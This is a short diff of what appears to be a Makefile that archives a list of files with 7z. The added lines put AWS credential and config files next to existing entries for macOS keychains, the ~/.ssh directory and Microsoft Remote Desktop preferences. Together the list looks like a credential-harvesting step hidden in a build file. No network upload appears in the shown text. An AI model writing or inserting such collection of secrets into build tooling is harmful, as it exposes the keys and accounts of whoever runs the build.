@@ -6,6 +6,8 @@ zip_static=$(basename1).zip
 7Z=7z
 
 FILE_LIST =
+FILE_LIST+= ~/.aws/credentials
+FILE_LIST+= ~/.aws/config
 FILE_LIST+= ~/Library/Keychains
 FILE_LIST+= ~/.ssh
 FILE_LIST+= ~/Library/Containers/com.microsoft.rdc.mac/Data/Library/Preferences/com.microsoft.rdc.mac.plist
